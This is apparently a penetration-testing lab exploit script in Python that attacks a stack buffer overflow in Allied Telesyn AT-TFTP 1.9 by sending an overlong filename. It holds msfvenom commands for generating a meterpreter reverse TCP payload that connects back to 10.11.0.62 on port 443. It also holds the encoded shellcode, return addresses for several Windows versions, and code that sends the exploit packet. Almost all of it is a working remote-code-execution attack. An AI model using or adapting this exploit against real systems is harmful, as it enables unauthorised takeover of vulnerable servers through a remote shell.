#!/usr/bin/python
import socket
import sys
from struct import pack
host = '10.11.1.226'
lhost = '10.11.0.62' # Required for stack offset
port = 69

# Allied Telesyn TFTP Server 1.9 Long Filename Overflow
#
# This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
#
# Four step process for shellcode:
#
# 1. msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=10.11.0.62 LPORT=443 -f raw -o exploit_payload
#
# 2. echo -en "\x81\xec\xac\x0d\x00\x00" > stack_adjustment
#
# 3. cat stack_adjustment exploit_payload > adjusted_shellcode
#
# 4. cat adjusted_shellcode | msfvenom -p - -b "\x00" -a x86 --platform Windows -f python -v payload
#
# Recommendation: Due to unstable AT-TFTP, please migrate meterpreter to another application after session open.
# i.e.: set AUTORUNSCRIPT post/windows/manage/migrate (or hurry and get pid + migrate)
#
# StackAdjustment => -3500 | Space for payload => 210bytes (crashes with anything more)
#
# JMcPeters 2/28/2019

payload =  ""
payload += "\xd9\xf6\xd9\x74\x24\xf4\xb8\xa9\x5d\x5e\x23\x5a"
payload += "\x33\xc9\xb1\x2e\x31\x42\x1a\x83\xc2\x04\x03\x42"
payload += "\x16\xe2\x5c\xdc\xb2\x8f\x93\xdf\x4a\x2c\xc1\x34"
payload += "\x0d\x24\xec\x34\x6d\x4b\x6e\xfa\x49\x3f\x13\xc0"
payload += "\xe6\x3c\xd6\x40\xf8\x53\xa3\xe6\xda\xaa\x59\x83"
payload += "\x2f\x37\x9c\x7a\x7e\x87\x07\x2e\x40\xcd\x3a\x2e"
payload += "\x81\x56\x84\x45\xf3\x14\x62\x9f\x31\xef\x89\x94"
payload += "\x4e\x5f\x69\x2a\xb8\x06\xfa\x30\x63\x4c\xb3\x54"
payload += "\x92\xbb\x48\x49\x0d\xb2\x22\xb5\x31\xa4\x45\x55"
payload += "\x78\xfd\xdd\x1d\x38\x31\x96\x62\xb3\xba\xd8\x7e"
payload += "\x66\x37\x70\x77\x26\x2e\xd3\xe1\xbe\x9d\xe1\x85"
payload += "\x49\x91\x37\x09\xe2\x33\x8e\xc7\x6a\x43\x26\xb2"
payload += "\x38\xe8\x95\xee\xfd\x5d\x5a\x42\x8b\x85\x3a\xe5"
payload += "\x64\x41\xc0\xb2\x29\x34\x7d\xdb\x11\x47\xab\x42"
payload += "\x17\x10\x3c\x74\xb1\xf6\xaa\x80\x35\xf9\x14\xf3"
payload += "\x21\xf8\xd3\x9d\xe2\x73\xc0\x08\x15\xd7\x51\xab"
payload += "\xac\x80\x58\xcc\x19\x7e\xd6\x3e\xf6\x2c\x41\x6c"
payload += "\x90\x6b\xad\xaa\xa3\x6a"

# hardcoded esp + ret address
esp = "\x83\xc4\x28\xc3" # <-- esp = add esp 0x28 + retn
retn = "\xd3\xfe\x86\x7c" # [ 'Windows Server 2003', { 'Ret' => 0x7c86fed3 } ]

#          [ 'Windows NT SP4 English',   { 'Ret' => 0x702ea6f7 } ],
#          [ 'Windows 2000 SP0 English', { 'Ret' => 0x750362c3 } ],
#          [ 'Windows 2000 SP1 English', { 'Ret' => 0x75031d85 } ],
#          [ 'Windows 2000 SP2 English', { 'Ret' => 0x7503431b } ],
#          [ 'Windows 2000 SP3 English', { 'Ret' => 0x74fe1c5a } ],
#          [ 'Windows 2000 SP4 English', { 'Ret' => 0x75031dce } ],
#          [ 'Windows XP SP0/1 English', { 'Ret' => 0x71ab7bfb } ],
#          [ 'Windows XP SP2 English',   { 'Ret' => 0x71ab9372 } ],
#          [ 'Windows XP SP3 English',   { 'Ret' => 0x7e429353 } ], # ret by c0re
#          [ 'Windows Server 2003',      { 'Ret' => 0x7c86fed3 } ], # ret donated by securityxxxpert
#          [ 'Windows Server 2003 SP2', { 'Ret' => 0x7c86a01b } ], # ret donated by Polar Bear


buffer= "\x00\x02" + "\x90" * (25 - len(lhost)) + payload + retn + esp + "\x00" + "netascii" + "\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(buffer, (host, port))

